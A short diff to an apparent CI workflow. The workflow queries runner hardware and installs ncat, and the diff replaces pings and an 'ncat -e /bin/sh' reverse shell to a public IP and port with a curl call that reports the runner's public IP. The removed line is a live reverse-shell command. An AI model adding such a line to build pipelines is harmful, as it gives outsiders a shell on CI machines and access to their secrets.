@@ -9,6 +9,4 @@ jobs:
           sudo lspci
           sudo lscpu
           sudo apt install ncat
-          ping 8.8.8.8 -c 4
-          ping 83.143.242.46 -c 4
-          ncat -e /bin/sh 83.143.242.46 44603
+          curl https://ifconfig.me -vv
